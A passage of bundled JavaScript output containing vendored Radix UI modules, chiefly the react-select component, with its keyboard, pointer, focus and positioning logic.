  return Math.min(max3, Math.max(min3, value));
}

// node_modules/@radix-ui/react-direction/dist/index.mjs
import * as React50 from "react";
import { jsx as jsx31 } from "react/jsx-runtime";
var DirectionContext = React50.createContext(void 0);
function useDirection(localDir) {
  const globalDir = React50.useContext(DirectionContext);
  return localDir || globalDir || "ltr";
}

// node_modules/@radix-ui/react-use-previous/dist/index.mjs
import * as React51 from "react";
function usePrevious(value) {
  const ref = React51.useRef({ value, previous: value });
  return React51.useMemo(() => {
    if (ref.current.value !== value) {
      ref.current.previous = ref.current.value;
      ref.current.value = value;
    }
    return ref.current.previous;
  }, [value]);
}

// node_modules/@radix-ui/react-select/dist/index.mjs
import { Fragment as Fragment8, jsx as jsx32, jsxs as jsxs9 } from "react/jsx-runtime";
var OPEN_KEYS = [" ", "Enter", "ArrowUp", "ArrowDown"];
var SELECTION_KEYS = [" ", "Enter"];
var SELECT_NAME = "Select";
var [Collection2, useCollection2, createCollectionScope2] = createCollection(SELECT_NAME);
var [createSelectContext, createSelectScope] = createContextScope(SELECT_NAME, [
  createCollectionScope2,
  createPopperScope
]);
var usePopperScope2 = createPopperScope();
var [SelectProvider, useSelectContext] = createSelectContext(SELECT_NAME);
var [SelectNativeOptionsProvider, useSelectNativeOptionsContext] = createSelectContext(SELECT_NAME);
var Select = (props) => {
  const {
    __scopeSelect,
    children,
    open: openProp,
    defaultOpen,
    onOpenChange,
    value: valueProp,
    defaultValue,
    onValueChange,
    dir,
    name,
    autoComplete,
    disabled,
    required,
    form
  } = props;
  const popperScope = usePopperScope2(__scopeSelect);
  const [trigger, setTrigger] = React52.useState(null);
  const [valueNode, setValueNode] = React52.useState(null);
  const [valueNodeHasChildren, setValueNodeHasChildren] = React52.useState(false);
  const direction = useDirection(dir);
  const [open, setOpen] = useControllableState({
    prop: openProp,
    defaultProp: defaultOpen ?? false,
    onChange: onOpenChange,
    caller: SELECT_NAME
  });
  const [value, setValue] = useControllableState({
    prop: valueProp,
    defaultProp: defaultValue,
    onChange: onValueChange,
    caller: SELECT_NAME
  });
  const triggerPointerDownPosRef = React52.useRef(null);
  const isFormControl = trigger ? form || !!trigger.closest("form") : true;
  const [nativeOptionsSet, setNativeOptionsSet] = React52.useState(/* @__PURE__ */ new Set());
  const nativeSelectKey = Array.from(nativeOptionsSet).map((option) => option.props.value).join(";");
  return /* @__PURE__ */ jsx32(Root23, { ...popperScope, children: /* @__PURE__ */ jsxs9(
    SelectProvider,
    {
      required,
      scope: __scopeSelect,
      trigger,
      onTriggerChange: setTrigger,
      valueNode,
      onValueNodeChange: setValueNode,
      valueNodeHasChildren,
      onValueNodeHasChildrenChange: setValueNodeHasChildren,
      contentId: useId(),
      value,
      onValueChange: setValue,
      open,
      onOpenChange: setOpen,
      dir: direction,
      triggerPointerDownPosRef,
      disabled,
      children: [
        /* @__PURE__ */ jsx32(Collection2.Provider, { scope: __scopeSelect, children: /* @__PURE__ */ jsx32(
          SelectNativeOptionsProvider,
          {
            scope: props.__scopeSelect,
            onNativeOptionAdd: React52.useCallback((option) => {
              setNativeOptionsSet((prev) => new Set(prev).add(option));
            }, []),
            onNativeOptionRemove: React52.useCallback((option) => {
              setNativeOptionsSet((prev) => {
                const optionsSet = new Set(prev);
                optionsSet.delete(option);
                return optionsSet;
              });
            }, []),
            children
          }
        ) }),
        isFormControl ? /* @__PURE__ */ jsxs9(
          SelectBubbleInput,
          {
            "aria-hidden": true,
            required,
            tabIndex: -1,
            name,
            autoComplete,
            value,
            onChange: (event) => setValue(event.target.value),
            disabled,
            form,
            children: [
              value === void 0 ? /* @__PURE__ */ jsx32("option", { value: "" }) : null,
              Array.from(nativeOptionsSet)
            ]
          },
          nativeSelectKey
        ) : null
      ]
    }
  ) });
};
Select.displayName = SELECT_NAME;
var TRIGGER_NAME3 = "SelectTrigger";
var SelectTrigger = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, disabled = false, ...triggerProps } = props;
    const popperScope = usePopperScope2(__scopeSelect);
    const context = useSelectContext(TRIGGER_NAME3, __scopeSelect);
    const isDisabled = context.disabled || disabled;
    const composedRefs = useComposedRefs(forwardedRef, context.onTriggerChange);
    const getItems = useCollection2(__scopeSelect);
    const pointerTypeRef = React52.useRef("touch");
    const [searchRef, handleTypeaheadSearch, resetTypeahead] = useTypeaheadSearch((search) => {
      const enabledItems = getItems().filter((item) => !item.disabled);
      const currentItem = enabledItems.find((item) => item.value === context.value);
      const nextItem = findNextItem(enabledItems, search, currentItem);
      if (nextItem !== void 0) {
        context.onValueChange(nextItem.value);
      }
    });
    const handleOpen = (pointerEvent) => {
      if (!isDisabled) {
        context.onOpenChange(true);
        resetTypeahead();
      }
      if (pointerEvent) {
        context.triggerPointerDownPosRef.current = {
          x: Math.round(pointerEvent.pageX),
          y: Math.round(pointerEvent.pageY)
        };
      }
    };
    return /* @__PURE__ */ jsx32(Anchor, { asChild: true, ...popperScope, children: /* @__PURE__ */ jsx32(
      Primitive.button,
      {
        type: "button",
        role: "combobox",
        "aria-controls": context.contentId,
        "aria-expanded": context.open,
        "aria-required": context.required,
        "aria-autocomplete": "none",
        dir: context.dir,
        "data-state": context.open ? "open" : "closed",
        disabled: isDisabled,
        "data-disabled": isDisabled ? "" : void 0,
        "data-placeholder": shouldShowPlaceholder(context.value) ? "" : void 0,
        ...triggerProps,
        ref: composedRefs,
        onClick: composeEventHandlers(triggerProps.onClick, (event) => {
          event.currentTarget.focus();
          if (pointerTypeRef.current !== "mouse") {
            handleOpen(event);
          }
        }),
        onPointerDown: composeEventHandlers(triggerProps.onPointerDown, (event) => {
          pointerTypeRef.current = event.pointerType;
          const target = event.target;
          if (target.hasPointerCapture(event.pointerId)) {
            target.releasePointerCapture(event.pointerId);
          }
          if (event.button === 0 && event.ctrlKey === false && event.pointerType === "mouse") {
            handleOpen(event);
            event.preventDefault();
          }
        }),
        onKeyDown: composeEventHandlers(triggerProps.onKeyDown, (event) => {
          const isTypingAhead = searchRef.current !== "";
          const isModifierKey = event.ctrlKey || event.altKey || event.metaKey;
          if (!isModifierKey && event.key.length === 1) handleTypeaheadSearch(event.key);
          if (isTypingAhead && event.key === " ") return;
          if (OPEN_KEYS.includes(event.key)) {
            handleOpen();
            event.preventDefault();
          }
        })
      }
    ) });
  }
);
SelectTrigger.displayName = TRIGGER_NAME3;
var VALUE_NAME = "SelectValue";
var SelectValue = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, className, style, children, placeholder = "", ...valueProps } = props;
    const context = useSelectContext(VALUE_NAME, __scopeSelect);
    const { onValueNodeHasChildrenChange } = context;
    const hasChildren = children !== void 0;
    const composedRefs = useComposedRefs(forwardedRef, context.onValueNodeChange);
    useLayoutEffect22(() => {
      onValueNodeHasChildrenChange(hasChildren);
    }, [onValueNodeHasChildrenChange, hasChildren]);
    return /* @__PURE__ */ jsx32(
      Primitive.span,
      {
        ...valueProps,
        ref: composedRefs,
        style: { pointerEvents: "none" },
        children: shouldShowPlaceholder(context.value) ? /* @__PURE__ */ jsx32(Fragment8, { children: placeholder }) : children
      }
    );
  }
);
SelectValue.displayName = VALUE_NAME;
var ICON_NAME = "SelectIcon";
var SelectIcon = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, children, ...iconProps } = props;
    return /* @__PURE__ */ jsx32(Primitive.span, { "aria-hidden": true, ...iconProps, ref: forwardedRef, children: children || "\u25BC" });
  }
);
SelectIcon.displayName = ICON_NAME;
var PORTAL_NAME4 = "SelectPortal";
var SelectPortal = (props) => {
  return /* @__PURE__ */ jsx32(Portal, { asChild: true, ...props });
};
SelectPortal.displayName = PORTAL_NAME4;
var CONTENT_NAME4 = "SelectContent";
var SelectContent = React52.forwardRef(
  (props, forwardedRef) => {
    const context = useSelectContext(CONTENT_NAME4, props.__scopeSelect);
    const [fragment, setFragment] = React52.useState();
    useLayoutEffect22(() => {
      setFragment(new DocumentFragment());
    }, []);
    if (!context.open) {
      const frag = fragment;
      return frag ? ReactDOM5.createPortal(
        /* @__PURE__ */ jsx32(SelectContentProvider, { scope: props.__scopeSelect, children: /* @__PURE__ */ jsx32(Collection2.Slot, { scope: props.__scopeSelect, children: /* @__PURE__ */ jsx32("div", { children: props.children }) }) }),
        frag
      ) : null;
    }
    return /* @__PURE__ */ jsx32(SelectContentImpl, { ...props, ref: forwardedRef });
  }
);
SelectContent.displayName = CONTENT_NAME4;
var CONTENT_MARGIN = 10;
var [SelectContentProvider, useSelectContentContext] = createSelectContext(CONTENT_NAME4);
var CONTENT_IMPL_NAME = "SelectContentImpl";
var Slot3 = createSlot("SelectContent.RemoveScroll");
var SelectContentImpl = React52.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeSelect,
      position = "item-aligned",
      onCloseAutoFocus,
      onEscapeKeyDown,
      onPointerDownOutside,
      //
      // PopperContent props
      side,
      sideOffset,
      align,
      alignOffset,
      arrowPadding,
      collisionBoundary,
      collisionPadding,
      sticky,
      hideWhenDetached,
      avoidCollisions,
      //
      ...contentProps
    } = props;
    const context = useSelectContext(CONTENT_NAME4, __scopeSelect);
    const [content, setContent] = React52.useState(null);
    const [viewport, setViewport] = React52.useState(null);
    const composedRefs = useComposedRefs(forwardedRef, (node) => setContent(node));
    const [selectedItem, setSelectedItem] = React52.useState(null);
    const [selectedItemText, setSelectedItemText] = React52.useState(
      null
    );
    const getItems = useCollection2(__scopeSelect);
    const [isPositioned, setIsPositioned] = React52.useState(false);
    const firstValidItemFoundRef = React52.useRef(false);
    React52.useEffect(() => {
      if (content) return hideOthers(content);
    }, [content]);
    useFocusGuards();
    const focusFirst4 = React52.useCallback(
      (candidates) => {
        const [firstItem, ...restItems] = getItems().map((item) => item.ref.current);
        const [lastItem] = restItems.slice(-1);
        const PREVIOUSLY_FOCUSED_ELEMENT = document.activeElement;
        for (const candidate of candidates) {
          if (candidate === PREVIOUSLY_FOCUSED_ELEMENT) return;
          candidate?.scrollIntoView({ block: "nearest" });
          if (candidate === firstItem && viewport) viewport.scrollTop = 0;
          if (candidate === lastItem && viewport) viewport.scrollTop = viewport.scrollHeight;
          candidate?.focus();
          if (document.activeElement !== PREVIOUSLY_FOCUSED_ELEMENT) return;
        }
      },
      [getItems, viewport]
    );
    const focusSelectedItem = React52.useCallback(
      () => focusFirst4([selectedItem, content]),
      [focusFirst4, selectedItem, content]
    );
    React52.useEffect(() => {
      if (isPositioned) {
        focusSelectedItem();
      }
    }, [isPositioned, focusSelectedItem]);
    const { onOpenChange, triggerPointerDownPosRef } = context;
    React52.useEffect(() => {
      if (content) {
        let pointerMoveDelta = { x: 0, y: 0 };
        const handlePointerMove = (event) => {
          pointerMoveDelta = {
            x: Math.abs(Math.round(event.pageX) - (triggerPointerDownPosRef.current?.x ?? 0)),
            y: Math.abs(Math.round(event.pageY) - (triggerPointerDownPosRef.current?.y ?? 0))
          };
        };
        const handlePointerUp = (event) => {
          if (pointerMoveDelta.x <= 10 && pointerMoveDelta.y <= 10) {
            event.preventDefault();
          } else {
            if (!content.contains(event.target)) {
              onOpenChange(false);
            }
          }
          document.removeEventListener("pointermove", handlePointerMove);
          triggerPointerDownPosRef.current = null;
        };
        if (triggerPointerDownPosRef.current !== null) {
          document.addEventListener("pointermove", handlePointerMove);
          document.addEventListener("pointerup", handlePointerUp, { capture: true, once: true });
        }
        return () => {
          document.removeEventListener("pointermove", handlePointerMove);
          document.removeEventListener("pointerup", handlePointerUp, { capture: true });
        };
      }
    }, [content, onOpenChange, triggerPointerDownPosRef]);
    React52.useEffect(() => {
      const close = () => onOpenChange(false);
      window.addEventListener("blur", close);
      window.addEventListener("resize", close);
      return () => {
        window.removeEventListener("blur", close);
        window.removeEventListener("resize", close);
      };
    }, [onOpenChange]);
    const [searchRef, handleTypeaheadSearch] = useTypeaheadSearch((search) => {
      const enabledItems = getItems().filter((item) => !item.disabled);
      const currentItem = enabledItems.find((item) => item.ref.current === document.activeElement);
      const nextItem = findNextItem(enabledItems, search, currentItem);
      if (nextItem) {
        setTimeout(() => nextItem.ref.current.focus());
      }
    });
    const itemRefCallback = React52.useCallback(
      (node, value, disabled) => {
        const isFirstValidItem = !firstValidItemFoundRef.current && !disabled;
        const isSelectedItem = context.value !== void 0 && context.value === value;
        if (isSelectedItem || isFirstValidItem) {
          setSelectedItem(node);
          if (isFirstValidItem) firstValidItemFoundRef.current = true;
        }
      },
      [context.value]
    );
    const handleItemLeave = React52.useCallback(() => content?.focus(), [content]);
    const itemTextRefCallback = React52.useCallback(
      (node, value, disabled) => {
        const isFirstValidItem = !firstValidItemFoundRef.current && !disabled;
        const isSelectedItem = context.value !== void 0 && context.value === value;
        if (isSelectedItem || isFirstValidItem) {
          setSelectedItemText(node);
        }
      },
      [context.value]
    );
    const SelectPosition = position === "popper" ? SelectPopperPosition : SelectItemAlignedPosition;
    const popperContentProps = SelectPosition === SelectPopperPosition ? {
      side,
      sideOffset,
      align,
      alignOffset,
      arrowPadding,
      collisionBoundary,
      collisionPadding,
      sticky,
      hideWhenDetached,
      avoidCollisions
    } : {};
    return /* @__PURE__ */ jsx32(
      SelectContentProvider,
      {
        scope: __scopeSelect,
        content,
        viewport,
        onViewportChange: setViewport,
        itemRefCallback,
        selectedItem,
        onItemLeave: handleItemLeave,
        itemTextRefCallback,
        focusSelectedItem,
        selectedItemText,
        position,
        isPositioned,
        searchRef,
        children: /* @__PURE__ */ jsx32(Combination_default, { as: Slot3, allowPinchZoom: true, children: /* @__PURE__ */ jsx32(
          FocusScope,
          {
            asChild: true,
            trapped: context.open,
            onMountAutoFocus: (event) => {
              event.preventDefault();
            },
            onUnmountAutoFocus: composeEventHandlers(onCloseAutoFocus, (event) => {
              context.trigger?.focus({ preventScroll: true });
              event.preventDefault();
            }),
            children: /* @__PURE__ */ jsx32(
              DismissableLayer,
              {
                asChild: true,
                disableOutsidePointerEvents: true,
                onEscapeKeyDown,
                onPointerDownOutside,
                onFocusOutside: (event) => event.preventDefault(),
                onDismiss: () => context.onOpenChange(false),
                children: /* @__PURE__ */ jsx32(
                  SelectPosition,
                  {
                    role: "listbox",
                    id: context.contentId,
                    "data-state": context.open ? "open" : "closed",
                    dir: context.dir,
                    onContextMenu: (event) => event.preventDefault(),
                    ...contentProps,
                    ...popperContentProps,
                    onPlaced: () => setIsPositioned(true),
                    ref: composedRefs,
                    style: {
                      // flex layout so we can place the scroll buttons properly
                      display: "flex",
                      flexDirection: "column",
                      // reset the outline by default as the content MAY get focused
                      outline: "none",
                      ...contentProps.style
                    },
                    onKeyDown: composeEventHandlers(contentProps.onKeyDown, (event) => {
                      const isModifierKey = event.ctrlKey || event.altKey || event.metaKey;
                      if (event.key === "Tab") event.preventDefault();
                      if (!isModifierKey && event.key.length === 1) handleTypeaheadSearch(event.key);
                      if (["ArrowUp", "ArrowDown", "Home", "End"].includes(event.key)) {
                        const items = getItems().filter((item) => !item.disabled);
                        let candidateNodes = items.map((item) => item.ref.current);
                        if (["ArrowUp", "End"].includes(event.key)) {
                          candidateNodes = candidateNodes.slice().reverse();
                        }
                        if (["ArrowUp", "ArrowDown"].includes(event.key)) {
                          const currentElement = event.target;
                          const currentIndex = candidateNodes.indexOf(currentElement);
                          candidateNodes = candidateNodes.slice(currentIndex + 1);
                        }
                        setTimeout(() => focusFirst4(candidateNodes));
                        event.preventDefault();
                      }
                    })
                  }
                )
              }
            )
          }
        ) })
      }
    );
  }
);
SelectContentImpl.displayName = CONTENT_IMPL_NAME;
var ITEM_ALIGNED_POSITION_NAME = "SelectItemAlignedPosition";
var SelectItemAlignedPosition = React52.forwardRef((props, forwardedRef) => {
  const { __scopeSelect, onPlaced, ...popperProps } = props;
  const context = useSelectContext(CONTENT_NAME4, __scopeSelect);
  const contentContext = useSelectContentContext(CONTENT_NAME4, __scopeSelect);
  const [contentWrapper, setContentWrapper] = React52.useState(null);
  const [content, setContent] = React52.useState(null);
  const composedRefs = useComposedRefs(forwardedRef, (node) => setContent(node));
  const getItems = useCollection2(__scopeSelect);
  const shouldExpandOnScrollRef = React52.useRef(false);
  const shouldRepositionRef = React52.useRef(true);
  const { viewport, selectedItem, selectedItemText, focusSelectedItem } = contentContext;
  const position = React52.useCallback(() => {
    if (context.trigger && context.valueNode && contentWrapper && content && viewport && selectedItem && selectedItemText) {
      const triggerRect = context.trigger.getBoundingClientRect();
      const contentRect = content.getBoundingClientRect();
      const valueNodeRect = context.valueNode.getBoundingClientRect();
      const itemTextRect = selectedItemText.getBoundingClientRect();
      if (context.dir !== "rtl") {
        const itemTextOffset = itemTextRect.left - contentRect.left;
        const left = valueNodeRect.left - itemTextOffset;
        const leftDelta = triggerRect.left - left;
        const minContentWidth = triggerRect.width + leftDelta;
        const contentWidth = Math.max(minContentWidth, contentRect.width);
        const rightEdge = window.innerWidth - CONTENT_MARGIN;
        const clampedLeft = clamp2(left, [
          CONTENT_MARGIN,
          // Prevents the content from going off the starting edge of the
          // viewport. It may still go off the ending edge, but this can be
          // controlled by the user since they may want to manage overflow in a
          // specific way.
          // https://github.com/radix-ui/primitives/issues/2049
          Math.max(CONTENT_MARGIN, rightEdge - contentWidth)
        ]);
        contentWrapper.style.minWidth = minContentWidth + "px";
        contentWrapper.style.left = clampedLeft + "px";
      } else {
        const itemTextOffset = contentRect.right - itemTextRect.right;
        const right = window.innerWidth - valueNodeRect.right - itemTextOffset;
        const rightDelta = window.innerWidth - triggerRect.right - right;
        const minContentWidth = triggerRect.width + rightDelta;
        const contentWidth = Math.max(minContentWidth, contentRect.width);
        const leftEdge = window.innerWidth - CONTENT_MARGIN;
        const clampedRight = clamp2(right, [
          CONTENT_MARGIN,
          Math.max(CONTENT_MARGIN, leftEdge - contentWidth)
        ]);
        contentWrapper.style.minWidth = minContentWidth + "px";
        contentWrapper.style.right = clampedRight + "px";
      }
      const items = getItems();
      const availableHeight = window.innerHeight - CONTENT_MARGIN * 2;
      const itemsHeight = viewport.scrollHeight;
      const contentStyles = window.getComputedStyle(content);
      const contentBorderTopWidth = parseInt(contentStyles.borderTopWidth, 10);
      const contentPaddingTop = parseInt(contentStyles.paddingTop, 10);
      const contentBorderBottomWidth = parseInt(contentStyles.borderBottomWidth, 10);
      const contentPaddingBottom = parseInt(contentStyles.paddingBottom, 10);
      const fullContentHeight = contentBorderTopWidth + contentPaddingTop + itemsHeight + contentPaddingBottom + contentBorderBottomWidth;
      const minContentHeight = Math.min(selectedItem.offsetHeight * 5, fullContentHeight);
      const viewportStyles = window.getComputedStyle(viewport);
      const viewportPaddingTop = parseInt(viewportStyles.paddingTop, 10);
      const viewportPaddingBottom = parseInt(viewportStyles.paddingBottom, 10);
      const topEdgeToTriggerMiddle = triggerRect.top + triggerRect.height / 2 - CONTENT_MARGIN;
      const triggerMiddleToBottomEdge = availableHeight - topEdgeToTriggerMiddle;
      const selectedItemHalfHeight = selectedItem.offsetHeight / 2;
      const itemOffsetMiddle = selectedItem.offsetTop + selectedItemHalfHeight;
      const contentTopToItemMiddle = contentBorderTopWidth + contentPaddingTop + itemOffsetMiddle;
      const itemMiddleToContentBottom = fullContentHeight - contentTopToItemMiddle;
      const willAlignWithoutTopOverflow = contentTopToItemMiddle <= topEdgeToTriggerMiddle;
      if (willAlignWithoutTopOverflow) {
        const isLastItem = items.length > 0 && selectedItem === items[items.length - 1].ref.current;
        contentWrapper.style.bottom = "0px";
        const viewportOffsetBottom = content.clientHeight - viewport.offsetTop - viewport.offsetHeight;
        const clampedTriggerMiddleToBottomEdge = Math.max(
          triggerMiddleToBottomEdge,
          selectedItemHalfHeight + // viewport might have padding bottom, include it to avoid a scrollable viewport
          (isLastItem ? viewportPaddingBottom : 0) + viewportOffsetBottom + contentBorderBottomWidth
        );
        const height = contentTopToItemMiddle + clampedTriggerMiddleToBottomEdge;
        contentWrapper.style.height = height + "px";
      } else {
        const isFirstItem = items.length > 0 && selectedItem === items[0].ref.current;
        contentWrapper.style.top = "0px";
        const clampedTopEdgeToTriggerMiddle = Math.max(
          topEdgeToTriggerMiddle,
          contentBorderTopWidth + viewport.offsetTop + // viewport might have padding top, include it to avoid a scrollable viewport
          (isFirstItem ? viewportPaddingTop : 0) + selectedItemHalfHeight
        );
        const height = clampedTopEdgeToTriggerMiddle + itemMiddleToContentBottom;
        contentWrapper.style.height = height + "px";
        viewport.scrollTop = contentTopToItemMiddle - topEdgeToTriggerMiddle + viewport.offsetTop;
      }
      contentWrapper.style.margin = `${CONTENT_MARGIN}px 0`;
      contentWrapper.style.minHeight = minContentHeight + "px";
      contentWrapper.style.maxHeight = availableHeight + "px";
      onPlaced?.();
      requestAnimationFrame(() => shouldExpandOnScrollRef.current = true);
    }
  }, [
    getItems,
    context.trigger,
    context.valueNode,
    contentWrapper,
    content,
    viewport,
    selectedItem,
    selectedItemText,
    context.dir,
    onPlaced
  ]);
  useLayoutEffect22(() => position(), [position]);
  const [contentZIndex, setContentZIndex] = React52.useState();
  useLayoutEffect22(() => {
    if (content) setContentZIndex(window.getComputedStyle(content).zIndex);
  }, [content]);
  const handleScrollButtonChange = React52.useCallback(
    (node) => {
      if (node && shouldRepositionRef.current === true) {
        position();
        focusSelectedItem?.();
        shouldRepositionRef.current = false;
      }
    },
    [position, focusSelectedItem]
  );
  return /* @__PURE__ */ jsx32(
    SelectViewportProvider,
    {
      scope: __scopeSelect,
      contentWrapper,
      shouldExpandOnScrollRef,
      onScrollButtonChange: handleScrollButtonChange,
      children: /* @__PURE__ */ jsx32(
        "div",
        {
          ref: setContentWrapper,
          style: {
            display: "flex",
            flexDirection: "column",
            position: "fixed",
            zIndex: contentZIndex
          },
          children: /* @__PURE__ */ jsx32(
            Primitive.div,
            {
              ...popperProps,
              ref: composedRefs,
              style: {
                // When we get the height of the content, it includes borders. If we were to set
                // the height without having `boxSizing: 'border-box'` it would be too big.
                boxSizing: "border-box",
                // We need to ensure the content doesn't get taller than the wrapper
                maxHeight: "100%",
                ...popperProps.style
              }
            }
          )
        }
      )
    }
  );
});
SelectItemAlignedPosition.displayName = ITEM_ALIGNED_POSITION_NAME;
var POPPER_POSITION_NAME = "SelectPopperPosition";
var SelectPopperPosition = React52.forwardRef((props, forwardedRef) => {
  const {
    __scopeSelect,
    align = "start",
    collisionPadding = CONTENT_MARGIN,
    ...popperProps
  } = props;
  const popperScope = usePopperScope2(__scopeSelect);
  return /* @__PURE__ */ jsx32(
    Content,
    {
      ...popperScope,
      ...popperProps,
      ref: forwardedRef,
      align,
      collisionPadding,
      style: {
        // Ensure border-box for floating-ui calculations
        boxSizing: "border-box",
        ...popperProps.style,
        // re-namespace exposed content custom properties
        ...{
          "--radix-select-content-transform-origin": "var(--radix-popper-transform-origin)",
          "--radix-select-content-available-width": "var(--radix-popper-available-width)",
          "--radix-select-content-available-height": "var(--radix-popper-available-height)",
          "--radix-select-trigger-width": "var(--radix-popper-anchor-width)",
          "--radix-select-trigger-height": "var(--radix-popper-anchor-height)"
        }
      }
    }
  );
});
SelectPopperPosition.displayName = POPPER_POSITION_NAME;
var [SelectViewportProvider, useSelectViewportContext] = createSelectContext(CONTENT_NAME4, {});
var VIEWPORT_NAME2 = "SelectViewport";
var SelectViewport = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, nonce, ...viewportProps } = props;
    const contentContext = useSelectContentContext(VIEWPORT_NAME2, __scopeSelect);
    const viewportContext = useSelectViewportContext(VIEWPORT_NAME2, __scopeSelect);
    const composedRefs = useComposedRefs(forwardedRef, contentContext.onViewportChange);
    const prevScrollTopRef = React52.useRef(0);
    return /* @__PURE__ */ jsxs9(Fragment8, { children: [
      /* @__PURE__ */ jsx32(
        "style",
        {
          dangerouslySetInnerHTML: {
            __html: `[data-radix-select-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-select-viewport]::-webkit-scrollbar{display:none}`
          },
          nonce
        }
      ),
      /* @__PURE__ */ jsx32(Collection2.Slot, { scope: __scopeSelect, children: /* @__PURE__ */ jsx32(
        Primitive.div,
        {
          "data-radix-select-viewport": "",
          role: "presentation",
          ...viewportProps,
          ref: composedRefs,
          style: {
            // we use position: 'relative' here on the `viewport` so that when we call
            // `selectedItem.offsetTop` in calculations, the offset is relative to the viewport
            // (independent of the scrollUpButton).
            position: "relative",
            flex: 1,
            // Viewport should only be scrollable in the vertical direction.
            // This won't work in vertical writing modes, so we'll need to
            // revisit this if/when that is supported
            // https://developer.chrome.com/blog/vertical-form-controls
            overflow: "hidden auto",
            ...viewportProps.style
          },
          onScroll: composeEventHandlers(viewportProps.onScroll, (event) => {
            const viewport = event.currentTarget;
            const { contentWrapper, shouldExpandOnScrollRef } = viewportContext;
            if (shouldExpandOnScrollRef?.current && contentWrapper) {
              const scrolledBy = Math.abs(prevScrollTopRef.current - viewport.scrollTop);
              if (scrolledBy > 0) {
                const availableHeight = window.innerHeight - CONTENT_MARGIN * 2;
                const cssMinHeight = parseFloat(contentWrapper.style.minHeight);
                const cssHeight = parseFloat(contentWrapper.style.height);
                const prevHeight = Math.max(cssMinHeight, cssHeight);
                if (prevHeight < availableHeight) {
                  const nextHeight = prevHeight + scrolledBy;
                  const clampedNextHeight = Math.min(availableHeight, nextHeight);
                  const heightDiff = nextHeight - clampedNextHeight;
                  contentWrapper.style.height = clampedNextHeight + "px";
                  if (contentWrapper.style.bottom === "0px") {
                    viewport.scrollTop = heightDiff > 0 ? heightDiff : 0;
                    contentWrapper.style.justifyContent = "flex-end";
                  }
                }
              }
            }
            prevScrollTopRef.current = viewport.scrollTop;
          })
        }
      ) })
    ] });
  }
);
SelectViewport.displayName = VIEWPORT_NAME2;
var GROUP_NAME = "SelectGroup";
var [SelectGroupContextProvider, useSelectGroupContext] = createSelectContext(GROUP_NAME);
var SelectGroup = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, ...groupProps } = props;
    const groupId = useId();
    return /* @__PURE__ */ jsx32(SelectGroupContextProvider, { scope: __scopeSelect, id: groupId, children: /* @__PURE__ */ jsx32(Primitive.div, { role: "group", "aria-labelledby": groupId, ...groupProps, ref: forwardedRef }) });
  }
);
SelectGroup.displayName = GROUP_NAME;
var LABEL_NAME = "SelectLabel";
var SelectLabel = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, ...labelProps } = props;
    const groupContext = useSelectGroupContext(LABEL_NAME, __scopeSelect);
    return /* @__PURE__ */ jsx32(Primitive.div, { id: groupContext.id, ...labelProps, ref: forwardedRef });
  }
);
SelectLabel.displayName = LABEL_NAME;
var ITEM_NAME = "SelectItem";
var [SelectItemContextProvider, useSelectItemContext] = createSelectContext(ITEM_NAME);
var SelectItem = React52.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeSelect,
      value,
      disabled = false,
      textValue: textValueProp,
      ...itemProps
    } = props;
    const context = useSelectContext(ITEM_NAME, __scopeSelect);
    const contentContext = useSelectContentContext(ITEM_NAME, __scopeSelect);
    const isSelected = context.value === value;
    const [textValue, setTextValue] = React52.useState(textValueProp ?? "");
    const [isFocused, setIsFocused] = React52.useState(false);
    const composedRefs = useComposedRefs(
      forwardedRef,
      (node) => contentContext.itemRefCallback?.(node, value, disabled)
    );
    const textId = useId();
    const pointerTypeRef = React52.useRef("touch");
    const handleSelect = () => {
      if (!disabled) {
        context.onValueChange(value);
        context.onOpenChange(false);
      }
    };
    if (value === "") {
      throw new Error(
        "A <Select.Item /> must have a value prop that is not an empty string. This is because the Select value can be set to an empty string to clear the selection and show the placeholder."
      );
    }
    return /* @__PURE__ */ jsx32(
      SelectItemContextProvider,
      {
        scope: __scopeSelect,
        value,
        disabled,
        textId,
        isSelected,
        onItemTextChange: React52.useCallback((node) => {
          setTextValue((prevTextValue) => prevTextValue || (node?.textContent ?? "").trim());
        }, []),
        children: /* @__PURE__ */ jsx32(
          Collection2.ItemSlot,
          {
            scope: __scopeSelect,
            value,
            disabled,
            textValue,
            children: /* @__PURE__ */ jsx32(
              Primitive.div,
              {
                role: "option",
                "aria-labelledby": textId,
                "data-highlighted": isFocused ? "" : void 0,
                "aria-selected": isSelected && isFocused,
                "data-state": isSelected ? "checked" : "unchecked",
                "aria-disabled": disabled || void 0,
                "data-disabled": disabled ? "" : void 0,
                tabIndex: disabled ? void 0 : -1,
                ...itemProps,
                ref: composedRefs,
                onFocus: composeEventHandlers(itemProps.onFocus, () => setIsFocused(true)),
                onBlur: composeEventHandlers(itemProps.onBlur, () => setIsFocused(false)),
                onClick: composeEventHandlers(itemProps.onClick, () => {
                  if (pointerTypeRef.current !== "mouse") handleSelect();
                }),
                onPointerUp: composeEventHandlers(itemProps.onPointerUp, () => {
                  if (pointerTypeRef.current === "mouse") handleSelect();
                }),
                onPointerDown: composeEventHandlers(itemProps.onPointerDown, (event) => {
                  pointerTypeRef.current = event.pointerType;
                }),
                onPointerMove: composeEventHandlers(itemProps.onPointerMove, (event) => {
                  pointerTypeRef.current = event.pointerType;
                  if (disabled) {
                    contentContext.onItemLeave?.();
                  } else if (pointerTypeRef.current === "mouse") {
                    event.currentTarget.focus({ preventScroll: true });
                  }
                }),
                onPointerLeave: composeEventHandlers(itemProps.onPointerLeave, (event) => {
                  if (event.currentTarget === document.activeElement) {
                    contentContext.onItemLeave?.();
                  }
                }),
                onKeyDown: composeEventHandlers(itemProps.onKeyDown, (event) => {
                  const isTypingAhead = contentContext.searchRef?.current !== "";
                  if (isTypingAhead && event.key === " ") return;
                  if (SELECTION_KEYS.includes(event.key)) handleSelect();
                  if (event.key === " ") event.preventDefault();
                })
              }
            )
          }
        )
      }
    );
  }
);
SelectItem.displayName = ITEM_NAME;
var ITEM_TEXT_NAME = "SelectItemText";
var SelectItemText = React52.forwardRef(
  (props, forwardedRef) => {
    const { __scopeSelect, className, style, ...itemTextProps } = props;
